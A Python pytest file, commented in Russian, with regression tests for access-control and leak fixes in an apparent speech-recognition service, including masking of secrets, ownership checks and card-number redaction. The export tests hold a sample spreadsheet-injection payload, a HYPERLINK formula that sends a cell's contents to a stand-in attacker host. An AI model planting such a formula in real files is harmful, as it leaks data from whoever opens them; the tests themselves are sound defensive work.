"""Заход 35: разграничение доступа и утечки.

Каждая проверка здесь закрывает находку сплошной ревизии и до исправления
падала. Общее у них одно: защита стояла на одном маршруте и отсутствовала на
соседнем, который отвечает на тот же вопрос другими словами.
"""
from __future__ import annotations

import io
import math
import struct
import wave
import zipfile
from pathlib import Path

import pytest
from asrhub.api import create_app
from asrhub.config import load
from fastapi.testclient import TestClient


def _wav(секунд: float = 1.0) -> bytes:
    буфер = io.BytesIO()
    with wave.open(буфер, "wb") as файл:
        файл.setnchannels(1)
        файл.setsampwidth(2)
        файл.setframerate(16000)
        файл.writeframes(b"".join(struct.pack("<h", int(3000 * math.sin(и / 8)))
                                  for и in range(int(16000 * секунд))))
    return буфер.getvalue()


@pytest.fixture()
def ключи(data_dir: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("ASRHUB_MODEL", "demo-simulator")
    monkeypatch.setenv("ASRHUB_ENGINE", "demo")
    monkeypatch.setenv("ASRHUB_AUTH_ENABLED", "true")
    настройки = load()
    настройки.api_keys["ah_admin"] = {"name": "админ", "role": "admin", "enabled": True}
    настройки.api_keys["ah_alice"] = {"name": "Алиса", "role": "user", "enabled": True}
    настройки.api_keys["ah_bob"] = {"name": "Боб", "role": "user", "enabled": True}
    настройки.api_keys["ah_ro"] = {"name": "чтение", "role": "readonly", "enabled": True}
    return настройки


# ---------------------------------------------------------------------------
# Настройки
# ---------------------------------------------------------------------------


def test_пароль_станции_не_уходит_в_настройках(ключи):
    """`GET /api/settings` отдавал пароль AMI открытым текстом.

    Учётные данные станций лежат не отдельным ключом, а внутри значения
    `telephony_stations`, и перечень секретов до них не доставал. Соседний
    `GET /api/telephony/stations` прячет пароль даже от администратора —
    защита стояла на одном маршруте и отсутствовала на другом.
    """
    ключи.set("telephony_stations", [{
        "id": "главная", "name": "Головной офис", "source": "ami",
        "host": "10.0.0.5", "port": 5038, "username": "asrhub",
        "secret": "пароль-АТС-9137", "recordings_dir": "/var/spool/asterisk/monitor",
    }], source="test")
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        for ключ in ("ah_ro", "ah_alice", "ah_admin"):
            ответ = клиент.get("/api/settings", headers={"X-API-Key": ключ})
            assert ответ.status_code == 200, ответ.text
            текст = ответ.text
            assert "пароль-АТС-9137" not in текст, f"пароль станции виден ключу {ключ}"
            станции = ответ.json()["values"]["telephony_stations"]
            assert станции[0]["secret"] == "***"
            assert станции[0]["name"] == "Головной офис", "имя станции должно остаться"
        # Адреса и пути станции — только администратору, как в /telephony/stations.
        чтение = клиент.get("/api/settings", headers={"X-API-Key": "ah_ro"}).json()
        станция = чтение["values"]["telephony_stations"][0]
        assert "host" not in станция and "recordings_dir" not in станция
        админ = клиент.get("/api/settings", headers={"X-API-Key": "ah_admin"}).json()
        assert админ["values"]["telephony_stations"][0]["host"] == "10.0.0.5"


def test_адрес_трекера_это_секрет(ключи):
    """Третий адрес того же рода, что webhook_url и digest_url.

    Каталог сам советует направить его во входящий адрес рабочего чата, то
    есть токен лежит прямо в строке: знающий его пишет в чат от имени
    сервера. Двух соседей спрятали, третьего забыли.
    """
    ключи.set("tracker_url", "https://chat.example.com/hooks/T0/B1/ТОКЕН", source="test")
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        чтение = клиент.get("/api/settings", headers={"X-API-Key": "ah_ro"}).json()
        assert чтение["values"]["tracker_url"] == "***"
        админ = клиент.get("/api/settings", headers={"X-API-Key": "ah_admin"}).json()
        assert админ["values"]["tracker_url"].endswith("ТОКЕН"), \
            "администратору адрес нужен целиком"


def test_путь_к_файлу_настроек_только_администратору(ключи):
    """В этом файле лежат ключи доступа и токен Hugging Face.

    Соседний `GET /api/system` прячет путь за правами администратора; здесь
    он уходил любому ключу, и та защита становилась бессмысленной.
    """
    ключи.config_file = Path("/var/lib/asrhub/config.yaml")
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        for ключ in ("ah_ro", "ah_alice"):
            ответ = клиент.get("/api/settings", headers={"X-API-Key": ключ})
            assert ответ.json()["config_file"] is None, ключ
            assert "/var/lib/asrhub" not in ответ.text, ключ
        админ = клиент.get("/api/settings", headers={"X-API-Key": "ah_admin"}).json()
        assert админ["config_file"].endswith("config.yaml"), \
            "администратору путь нужен: он этот файл и правит"


# ---------------------------------------------------------------------------
# Чужой архив звонков
# ---------------------------------------------------------------------------


def test_чужую_строку_архива_не_перезаписать(ключи):
    """Ключ архива собирается из полей формы, а save_call обновляет молча.

    Достаточно было назвать настоящее имя станции — оно видно в
    `GET /api/telephony/stations` — и угадать «эпоха.счётчик», чтобы
    разговор филиала сменил владельца, потерял номера и оператора и пропал
    из отчётов того, кому принадлежал. Задвоения при этом не было: строка
    одна, прежней больше не существует.
    """
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        state.db.save_call("golovnoy-ofis:1757500001.7", job_id="job_настоящий",
                           owner="Алиса", src="+79990001122", dst="1043",
                           agent="1043", queue="продажи", duration=300,
                           started_at=1757500001.0)
        ответ = клиент.post(
            "/api/jobs", headers={"X-API-Key": "ah_bob"},
            files={"file": ("свой.wav", _wav(), "audio/wav")},
            data={"station": "golovnoy-ofis", "call_id": "1757500001.7",
                  "caller": "000", "agent": "999", "queue": "подмена"})
        assert ответ.status_code == 200, ответ.text
        звонок = ответ.json().get("call") or {}
        assert звонок.get("saved") is False, "чужая строка перезаписана"

        строка = state.db.query_one(
            "SELECT * FROM calls WHERE uniqueid=?", ("golovnoy-ofis:1757500001.7",))
        assert строка["owner"] == "Алиса"
        assert строка["job_id"] == "job_настоящий"
        assert строка["src"] == "+79990001122"
        assert строка["queue"] == "продажи"


def test_свою_строку_архива_обновлять_можно(ключи):
    """Предохранитель не должен ломать обычный путь: повторная отправка
    того же звонка тем же ключом обновляет строку, а не задваивает её."""
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        for очередь in ("первая", "вторая"):
            ответ = клиент.post(
                "/api/jobs", headers={"X-API-Key": "ah_alice"},
                files={"file": ("свой.wav", _wav(), "audio/wav")},
                data={"station": "своя", "call_id": "1.1", "queue": очередь})
            assert ответ.status_code == 200, ответ.text
            assert (ответ.json().get("call") or {}).get("saved") is True
        строки = state.db.query("SELECT * FROM calls WHERE uniqueid=?", ("своя:1.1",))
        assert len(строки) == 1
        assert строки[0]["queue"] == "вторая"


# ---------------------------------------------------------------------------
# Очередь к языковой модели
# ---------------------------------------------------------------------------


def _чужая_запись(state, кому: str = "Алиса") -> str:
    номер = state.db.create_job({"filename": "+79161234567 Иванов.wav",
                                 "model": "demo-simulator", "owner": кому})
    state.db.update_job(номер, status="completed", text="разговор")
    return номер


def test_очередь_модели_не_показывает_чужие_имена(ключи):
    """Имя файла — это в колл-центре номер клиента.

    Соседние `GET /api/jobs` и `GET /api/queue` его прячут, а очередь
    разбора отдавала любому ключу с правом записи.
    """
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        номер = _чужая_запись(state)
        state.db.llmq_put(номер, kind="разбор", priority=50)
        ответ = клиент.get("/api/llm/queue", headers={"X-API-Key": "ah_bob"})
        assert ответ.status_code == 200, ответ.text
        assert "Иванов" not in ответ.text, "чужое имя файла видно в очереди"
        assert ответ.json()["queue"]["total"] == 0
        # Своему владельцу — видно.
        своё = клиент.get("/api/llm/queue", headers={"X-API-Key": "ah_alice"}).json()
        assert [с["job_id"] for с in своё["queue"]["items"]] == [номер]


def test_чужая_текущая_запись_показывается_без_имени(ключи):
    """То, что видеокарта занята, не секрет. Чем именно — секрет.

    Карточка «Сейчас разбирается» показывала имя файла кому угодно, а это
    в колл-центре номер клиента.
    """
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        номер = _чужая_запись(state)
        state.llm_worker.current = номер
        state.llm_worker.current_since = 1.0

        чужому = клиент.get("/api/llm/queue", headers={"X-API-Key": "ah_bob"})
        assert "Иванов" not in чужому.text, "чужое имя видно в карточке «Сейчас»"
        текущее = чужому.json()["current"]
        assert текущее and текущее["filename"] == "чужая запись"
        assert текущее["job_id"] == ""

        своему = клиент.get("/api/llm/queue", headers={"X-API-Key": "ah_alice"}).json()
        assert своему["current"]["filename"] == "+79161234567 Иванов.wav"


def test_чужую_запись_не_поднять_и_не_снять(ключи):
    """Номер задания шёл из пути прямо в базу, не читая само задание.

    Проверить владельца было негде: ключ с правом записи снимал чужой
    разбор с очереди или поднимал его на видеокарту.
    """
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        номер = _чужая_запись(state)
        state.db.llmq_put(номер, kind="разбор", priority=50)

        поднять = клиент.post(f"/api/llm/queue/{номер}/top",
                              headers={"X-API-Key": "ah_bob"})
        assert поднять.status_code == 403, поднять.text
        снять = клиент.delete(f"/api/llm/queue/{номер}",
                              headers={"X-API-Key": "ah_bob"})
        assert снять.status_code == 403, снять.text

        строка = state.db.query_one("SELECT * FROM llm_queue WHERE job_id=?", (номер,))
        assert строка["state"] == "ждёт"
        assert строка["priority"] == 50


def test_чужой_номер_в_явном_списке_не_проходит(ключи):
    """«Разобрать моделью» из «Результатов» присылает явный список.

    Свои записи туда попадают отметкой в списке, чужие — только подбором
    номеров, и раньше подбор проходил.
    """
    ключи.set("llm_backend", "stub", source="test")
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        state = app.state.hub
        номер = _чужая_запись(state)
        ответ = клиент.post("/api/llm/queue/add", headers={"X-API-Key": "ah_bob"},
                            json={"job_ids": [номер]})
        assert ответ.status_code == 403, ответ.text
        assert state.db.query_one("SELECT * FROM llm_queue WHERE job_id=?",
                                  (номер,)) is None


# ---------------------------------------------------------------------------
# Нечисловой ввод
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("путь,тело", [
    ("/api/jobs/rescan", {"limit": "много"}),
    ("/api/jobs/rescan", {"filter": {"since": "вчера"}}),
    ("/api/jobs/rescan", {"filter": {"until": "завтра"}}),
    ("/api/llm/queue/add", {"limit": "много"}),
    ("/api/llm/queue/add", {"scope": "period", "since": "вчера"}),
    ("/api/llm/queue/add", {"scope": "period", "since": 1, "until": "завтра"}),
])
def test_нечисловое_значение_это_отказ_клиенту_а_не_поломка(ключи, путь, тело):
    """Тело здесь — свободный словарь, схемой не описанный.

    `float("вчера")` доходил до общего обработчика: клиент получал
    «внутреннюю ошибку сервера» и трассировку в журнале, хотя виноват был
    он сам. Соседние маршруты на такую же ошибку отвечают 400.
    """
    # Модель включена заглушкой: иначе маршрут очереди отвечает «модель
    # выключена» раньше, чем доходит до разбора числа, и проверка сторожила
    # бы не то.
    ключи.set("llm_backend", "stub", source="test")
    app = create_app(ключи, start_queue=False)
    with TestClient(app) as клиент:
        ответ = клиент.post(путь, headers={"X-API-Key": "ah_admin"}, json=тело)
        assert ответ.status_code != 500, ответ.text
        assert ответ.status_code == 400, ответ.text
        assert "Ожидается число" in ответ.text, ответ.text


# ---------------------------------------------------------------------------
# Выгрузки
# ---------------------------------------------------------------------------


ЗЛАЯ_КЛЕТКА = '=HYPERLINK("http://зло.рф/?x="&A1;"отчёт").wav'


def test_имя_файла_не_становится_формулой_в_csv():
    """Имя файла приходит от того, кто загрузил запись.

    Excel превращает строку с «=» в живую формулу при открытии, а этот
    файл по замыслу уходит руководителю и в бухгалтерию.
    """
    from asrhub.analytics_export import _собрать_csv

    архив = zipfile.ZipFile(io.BytesIO(_собрать_csv(
        [("лист", ["Файл"], [[ЗЛАЯ_КЛЕТКА]])], "период")))
    текст = архив.read("лист.csv").decode("utf-8-sig")
    строка = текст.splitlines()[1]
    assert not строка.lstrip('"').startswith("="), строка
    assert "HYPERLINK" in строка, "содержимое клетки теряться не должно"


def test_имя_файла_не_становится_формулой_в_xlsx():
    """openpyxl сам помечает такую строку как формулу (data_type='f')."""
    openpyxl = pytest.importorskip("openpyxl")
    from asrhub.analytics_export import _собрать_xlsx

    книга = openpyxl.load_workbook(io.BytesIO(_собрать_xlsx(
        [("лист", ["Файл", "Число"], [[ЗЛАЯ_КЛЕТКА, 5]])], "заголовок")))
    лист = книга["лист"]
    assert лист["A2"].data_type == "s", "клетка стала формулой"
    assert "HYPERLINK" in str(лист["A2"].value)
    assert лист["B2"].value == 5, "числа трогать не нужно"
    assert лист["B2"].data_type == "n"


# ---------------------------------------------------------------------------
# Обезличивание
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("текст", [
    "Диктую карту: 4111 1111 1111 1111 123",
    "Диктую карту: 4111 1111 1111 1111 12 25 123",
    "номер карты 4111111111111111 123",
    "код 123 карта 4111 1111 1111 1111",
])
def test_номер_карты_маскируется_и_с_хвостом(текст):
    """Карту диктуют не в одиночку: следом идут код с оборота и срок.

    Выражение жадное, на длинной цепочке Лун не сходится — и маскировалась
    не «часть номера», а ничего: полный номер уезжал в выгрузку, а отчёт об
    обезличивании показывал, что находок нет.
    """
    from asrhub.content import masking

    закрыто = masking.mask_text(текст)
    assert "4111" not in закрыто, закрыто
    assert "[карта]" in закрыто
    assert masking.count(текст).get("card") == 1


@pytest.mark.parametrize("текст", [
    "карта 4111 1111 1111 1112 и снилс",          # контрольная сумма не сходится
    "заказ 12345678901234567890 на складе",        # двадцать цифр подряд
    "товар 1234567890123456789 штук",              # девятнадцать подряд
])
def test_чужие_числа_картой_не_объявляются(текст):
    """Резать цепочку посередине нельзя.

    На девятнадцати цифрах подряд окно из тринадцати проходит Луна каждый
    десятый раз случайно, и номер заказа превращался бы в карту. Границы
    групп — это то, как карту записывают и диктуют.
    """
    from asrhub.content import masking

    assert masking.count(текст).get("card") is None, masking.mask_text(текст)
